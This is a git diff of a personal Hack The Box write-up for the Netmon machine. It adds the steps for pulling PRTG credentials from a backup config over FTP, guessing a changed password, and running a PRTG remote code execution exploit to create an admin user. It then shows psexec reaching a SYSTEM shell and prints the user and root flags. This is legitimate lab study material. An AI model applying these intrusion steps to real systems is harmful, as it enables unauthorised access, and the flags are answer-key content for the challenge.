@@ -4,7 +4,7 @@ title: Netmon HTB Write-Up
 machine_ip: 10.10.10.152
 os: Windows
 difficulty: Easy
-my_rating: 
+my_rating: 2
 tags:
   - Windows
   - PrivEsc
@@ -13,6 +13,9 @@ tags:
   - gobuster
   - searchsploit
   - webserver
+  - PRTG
+  - Paessler
+  - psexec
 references: "[[📚CTF Box Writeups]]"
 ---
 # Enumeration
@@ -20,7 +23,7 @@ references: "[[📚CTF Box Writeups]]"
 - Nmap
 ```
 ┌──(root㉿kali)-[~/Downloads]
-└─# nmap -sVC -Pn  10.10.10.152 
+└─# nmap -sVC -Pn 10.10.10.152 
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-08 16:52 PDT
 Nmap scan report for 10.10.10.152
 Host is up (0.097s latency).
@@ -82,18 +85,62 @@ Password:
 
 # Foothold
 - gain shell via exploit
-- Searchsploit shows PRTG Network Monitor 18.2.38 is vulnerable to (Authenticated) Remote Code Execution - `windows/webapps/46527.sh`
+- Searchsploit shows PRTG Network Monitor 18.2.38 is vulnerable to (Authenticated) Remote Code Execution - `windows/webapps/46527.sh` #PRTG #Paessler
+	- Uses CVE-2018-9276 
 	- exploit tells us to log into the app with default creds of `prtgadmin:prtgadmin`, grab the cookie once authenticated and use it in the script.
 	- Default creds won't work. Back to enumerating the config file.
-	- `ls -al` REMEMBER TO LOOK FOR HIDDEN FILES
-==resume here==
-
-
-
+	- After no luck enumerating with `ls` and `dir` we use `ls -al` and find a backup file called `PRTG Configuration.old.bak` in  `C:/Users/All Users/Paessler/PRTG Network Monitor`.
+	- When attempting to download this file, I got the following error:
+```
+tp: Reading from network: Interrupted system call
+  0% |                                                                                                                                                                                               |    -1        0.00 KiB/s    --:-- ETA
+550 The specified network name is no longer available. 
+```
+- To resolve this, type `bin` into FTP then try again
+- After downloading this config file, we find the `dbpassword` creds of `prtgadmin:PrTg@dmin2018`
+	- These creds don't work, however, we can guess it by changing it to `2019`
+	- `prtgadmin:PrTg@dmin2019` logged us into the webportal
+	
 # PrivEsc
-- escalate from webshell to user to root
+- escalate to root
+- Now we can try the exploit found above the the credentials
+	- Creds = `prtgadmin:PrTg@dmin2019`
+	- Cookies  are `_ga=GA1.4.2086952541.1728431675'
+		- `_gid=GA1.4.106429694.1728431675'
+		- `OCTOPUS1813713946=ezAyMDlFRDBFLUZGRUMtNEY1Qi1CNUI3LThCMTU5RjkxMUM4N30%3D
+		- `_gat=1`
+- Successfully ran this exploit and created a `pentest` admin user on 10.10.10.152. Now we can use `psexec.py` to gain a root shell!
+
+```
+┌──(root㉿kali)-[/usr/local/bin]
+└─# psexec.py pentest:'P3nT3st!'@10.10.10.152      
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.10.10.152.....
+[*] Found writable share ADMIN$
+[*] Uploading file dQLbwpWA.exe
+[*] Opening SVCManager on 10.10.10.152.....
+[*] Creating service xYJO on 10.10.10.152.....
+[*] Starting service xYJO.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+```
+
 
 User flag
 ```
 
+C:\Users\Public\Desktop> type user.txt
+0491a17b935bdd9d528f4f39f5bd9eab
+```
+
+Root flag - Administrator
+```
+C:\Users\Administrator\Desktop> type root.txt
+d3290e406df2d9230cbcf5702dbbe38b
 ```
